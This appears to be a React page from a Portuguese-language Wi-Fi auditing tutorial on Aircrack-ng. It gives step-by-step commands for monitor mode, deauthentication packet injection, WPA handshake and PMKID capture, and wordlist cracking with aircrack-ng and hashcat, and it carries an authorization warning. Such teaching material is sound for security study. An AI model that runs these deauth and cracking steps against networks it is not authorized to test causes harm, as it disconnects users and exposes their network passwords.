import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { ParamsTable } from "@/components/ui/ParamsTable";

export default function Aircrack() {
  return (
    <PageContainer
      title="Aircrack-ng"
      subtitle="Suite completa para auditoria de redes Wi-Fi — captura de handshake e cracking de WPA/WPA2."
      difficulty="avancado"
      timeToRead="15 min"
    >
      <AlertBox type="danger" title="Autorização ESSENCIAL">
        Atacar redes Wi-Fi sem autorização é crime em qualquer país. Use apenas em 
        sua própria rede ou em redes de laboratório com autorização explícita do proprietário.
      </AlertBox>

      <h2>Consultando a ajuda de cada ferramenta</h2>
      <CodeBlock language="bash" code={`# Cada ferramenta da suite tem seu próprio --help
airmon-ng --help
airodump-ng --help
aireplay-ng --help
aircrack-ng --help

# Exemplo de saída do airodump-ng --help (em inglês → traduzido abaixo):
# Usage: airodump-ng [options] <interface>
# Options:
#   -c, --channel <channels>  → canal(is) Wi-Fi a capturar
#   -d, --bssid <bssid>       → filtrar por MAC do ponto de acesso
#   -w, --write <prefixo>     → salvar captura em arquivo
#   --band <band>             → frequência (a=5GHz, b/g=2.4GHz)`} />

      <AlertBox type="info" title="Como ler o --help da suite Aircrack-ng">
        Cada ferramenta mostra suas opções com explicação breve em inglês. 
        As seções abaixo traduzem e detalham em português os parâmetros de cada ferramenta.
      </AlertBox>

      <h2>A suite Aircrack-ng</h2>
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 my-6">
        {[
          { tool: "airmon-ng", desc: "Ativa/desativa modo monitor na placa wireless. Necessário antes de tudo." },
          { tool: "airodump-ng", desc: "Captura pacotes de redes Wi-Fi próximas e salva em arquivo .cap" },
          { tool: "aireplay-ng", desc: "Injeta pacotes: deautenticação, replay de autenticação, etc." },
          { tool: "aircrack-ng", desc: "Quebra senhas WEP/WPA/WPA2 a partir de capturas .cap" },
          { tool: "airbase-ng", desc: "Cria APs falsos (evil twin) para ataques de engenharia social" },
          { tool: "airdecap-ng", desc: "Decripta capturas WEP/WPA quando você já tem a chave" },
        ].map((item, i) => (
          <div key={i} className="bg-card border border-border rounded-lg px-4 py-3 text-sm">
            <code className="text-primary font-mono">{item.tool}</code>
            <p className="text-xs text-muted-foreground mt-1">{item.desc}</p>
          </div>
        ))}
      </div>

      <h2>airmon-ng — ativando modo monitor</h2>
      <CodeBlock language="bash" code={`# Ver adaptadores disponíveis
sudo airmon-ng

# Matar processos que interferem (NetworkManager, wpa_supplicant)
sudo airmon-ng check kill

# Ativar modo monitor na interface wlan0
sudo airmon-ng start wlan0

# Ativar em canal específico
sudo airmon-ng start wlan0 6

# Desativar modo monitor
sudo airmon-ng stop wlan0mon`} />

      <ParamsTable
        title="airmon-ng — parâmetros explicados"
        params={[
          { flag: "check", desc: "Lista processos que podem interferir com o modo monitor (NetworkManager, wpa_supplicant).", exemplo: "sudo airmon-ng check" },
          { flag: "check kill", desc: "Para automaticamente todos os processos que interferem. ATENÇÃO: desconecta a internet!", exemplo: "sudo airmon-ng check kill" },
          { flag: "start INTERFACE", desc: "Coloca a interface em modo monitor. A interface geralmente se renomeia para wlan0mon.", exemplo: "sudo airmon-ng start wlan0" },
          { flag: "start INTERFACE CANAL", desc: "Ativa modo monitor fixado em um canal específico.", exemplo: "sudo airmon-ng start wlan0 6" },
          { flag: "stop INTERFACE", desc: "Desativa o modo monitor e volta ao modo gerenciado normal.", exemplo: "sudo airmon-ng stop wlan0mon" },
        ]}
      />

      <h2>airodump-ng — capturando tráfego</h2>
      <CodeBlock language="bash" code={`# Escanear todas as redes próximas
sudo airodump-ng wlan0mon

# Entendendo a saída do airodump-ng:
# BSSID     → MAC address do ponto de acesso (AP/roteador)
# PWR       → Potência do sinal (quanto mais alto, mais perto/melhor)
# Beacons   → Pacotes de beacon enviados pelo AP
# #Data     → Pacotes de dados capturados
# CH        → Canal Wi-Fi em que o AP opera
# ENC       → Tipo de criptografia (WPA2, WPA, WEP, OPN)
# CIPHER    → Algoritmo de criptografia (CCMP=AES, TKIP)
# AUTH      → Método de autenticação (PSK=senha pessoal, MGT=empresa)
# ESSID     → Nome da rede (nome que você vê no celular)

# Focar em uma rede específica e capturar
sudo airodump-ng wlan0mon \
  --bssid AA:BB:CC:DD:EE:FF \
  --channel 6 \
  --write captura_rede`} />

      <ParamsTable
        title="airodump-ng — parâmetros explicados em português"
        params={[
          { flag: "-c / --channel CANAL", desc: "Captura apenas no canal especificado. Essencial para focar em uma rede — evita pular entre canais.", exemplo: "airodump-ng wlan0mon -c 6" },
          { flag: "-d / --bssid MAC", desc: "Filtra captura pelo MAC address do ponto de acesso. Use o BSSID exato da rede alvo.", exemplo: "--bssid AA:BB:CC:DD:EE:FF" },
          { flag: "-w / --write PREFIXO", desc: "Salva a captura em arquivos com o prefixo dado. Gera: .cap (captura), .csv, .kismet.csv.", exemplo: "--write captura (gera captura-01.cap)" },
          { flag: "--ivs", desc: "Salva apenas IVs (Initialization Vectors) — usado em ataques WEP. Arquivo menor.", exemplo: "--ivs" },
          { flag: "--band BANDA", desc: "Define a frequência: a=5GHz, b=2.4GHz (legado), g=2.4GHz, abg=todas.", exemplo: "--band a (somente 5GHz)" },
          { flag: "--encrypt TIPO", desc: "Filtra para mostrar apenas redes com aquele tipo de criptografia.", exemplo: "--encrypt WPA2" },
          { flag: "--essid NOME", desc: "Filtra para mostrar/capturar apenas redes com aquele SSID.", exemplo: "--essid 'MinhaRede'" },
          { flag: "-a / --manufacturer", desc: "Exibe o fabricante dos dispositivos (baseado no OUI do MAC).", exemplo: "-a" },
        ]}
      />

      <h2>aireplay-ng — injeção de pacotes</h2>
      <CodeBlock language="bash" code={`# Tipo -0: deautenticação (força desconexão para capturar handshake)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# Envia 10 pacotes de deauth para todos os clientes do AP

# Deauth em cliente específico
sudo aireplay-ng --deauth 10 \
  -a AA:BB:CC:DD:EE:FF \
  -c 11:22:33:44:55:66 \
  wlan0mon`} />

      <ParamsTable
        title="aireplay-ng — ataques explicados"
        params={[
          { flag: "--deauth N / -0 N", desc: "Envia N pacotes de deautenticação. Força os clientes a se desconectarem do AP, obrigando a reconectar (gerando o handshake WPA).", exemplo: "--deauth 10 -a MAC_AP wlan0mon" },
          { flag: "-a MAC_AP", desc: "MAC address do ponto de acesso alvo (BSSID). Obrigatório em todos os ataques.", exemplo: "-a AA:BB:CC:DD:EE:FF" },
          { flag: "-c MAC_CLIENTE", desc: "MAC address de um cliente específico. Se omitido, o deauth é enviado para todos os clientes (broadcast).", exemplo: "-c 11:22:33:44:55:66" },
          { flag: "--fakeauth N / -1 N", desc: "Falsa autenticação com o AP. Necessário em ataques WEP para associar-se ao AP antes de injetar.", exemplo: "--fakeauth 0 -a MAC_AP wlan0mon" },
          { flag: "--arpreplay / -3", desc: "Replay de ARP — ataque WEP. Captura e re-injeta pacotes ARP para gerar mais IVs.", exemplo: "-3 -b MAC_AP -h MEU_MAC wlan0mon" },
          { flag: "-x PACOTES", desc: "Número de pacotes por segundo a injetar.", exemplo: "-x 100" },
        ]}
      />

      <h2>Capturando o handshake WPA/WPA2</h2>
      <CodeBlock language="bash" code={`# PASSO 1: Ativar modo monitor
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# PASSO 2: Identificar a rede alvo
sudo airodump-ng wlan0mon
# Anote: BSSID (MAC do AP), CH (canal), ESSID (nome)

# PASSO 3: Capturar na rede específica
sudo airodump-ng wlan0mon \
  --bssid AA:BB:CC:DD:EE:FF \
  --channel 6 \
  --write handshake_alvo
# Aguarde a coluna "WPA handshake:" aparecer no topo

# PASSO 4 (outro terminal): Forçar o handshake
sudo aireplay-ng --deauth 10 \
  -a AA:BB:CC:DD:EE:FF \
  wlan0mon

# PASSO 5: Confirmar o handshake capturado
sudo aircrack-ng handshake_alvo-01.cap`} />

      <h2>aircrack-ng — quebrando a senha</h2>
      <CodeBlock language="bash" code={`# Com wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake.cap

# Especificar BSSID (quando há múltiplas redes na captura)
sudo aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF handshake.cap`} />

      <ParamsTable
        title="aircrack-ng — parâmetros explicados"
        params={[
          { flag: "-w WORDLIST", desc: "Arquivo de wordlist (lista de senhas) para testar. Cada linha é uma senha candidata.", exemplo: "-w /usr/share/wordlists/rockyou.txt" },
          { flag: "-b BSSID", desc: "Filtra pela rede específica quando há múltiplas redes no arquivo de captura.", exemplo: "-b AA:BB:CC:DD:EE:FF" },
          { flag: "-e ESSID", desc: "Filtra pelo nome da rede (SSID) ao invés do BSSID.", exemplo: "-e 'NomeDaRede'" },
          { flag: "-l ARQUIVO", desc: "Salva a senha encontrada em um arquivo.", exemplo: "-l senha_encontrada.txt" },
          { flag: "-q", desc: "Modo quieto — menos saída na tela durante o processamento.", exemplo: "-q" },
          { flag: "-n BITS", desc: "Para ataques WEP: tamanho da chave (64, 128, 152, 256 ou 512 bits).", exemplo: "-n 64 (WEP de 64 bits)" },
        ]}
      />

      <h2>Quebrando com Hashcat (GPU — muito mais rápido)</h2>
      <CodeBlock language="bash" code={`# Converter captura para formato do hashcat
sudo apt install -y hcxtools
hcxpcapngtool -o handshake.hc22000 handshake.cap

# Quebrar com hashcat (GPU)
hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt

# Com regras (variações de senha)
hashcat -m 22000 handshake.hc22000 rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule`} />

      <h2>PMKID Attack — sem precisar de cliente</h2>
      <CodeBlock language="bash" code={`# Instalar hcxdumptool
sudo apt install -y hcxdumptool hcxtools

# Capturar PMKID (funciona sem cliente conectado!)
sudo hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1

# Converter e quebrar
hcxpcapngtool -o pmkid.hc22000 captura.pcapng
hashcat -m 22000 pmkid.hc22000 rockyou.txt`} />
    </PageContainer>
  );
}
